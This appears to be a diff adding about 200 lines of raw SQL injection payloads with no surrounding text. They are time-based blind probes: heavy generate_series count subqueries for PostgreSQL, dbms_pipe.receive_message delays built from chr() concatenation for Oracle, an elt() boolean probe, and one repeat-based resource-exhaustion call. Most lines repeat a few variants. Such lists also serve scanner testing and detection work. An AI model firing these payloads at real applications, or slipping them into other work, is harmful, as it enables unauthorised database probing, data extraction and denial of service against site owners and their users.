@@ -1,0 +1,200 @@
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'+  (  select jrmz where 4762  =  4762 and elt  (  9588  =  9794,9794   )    )   +'
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   "eevk"  =  "eevk
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --
+1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   
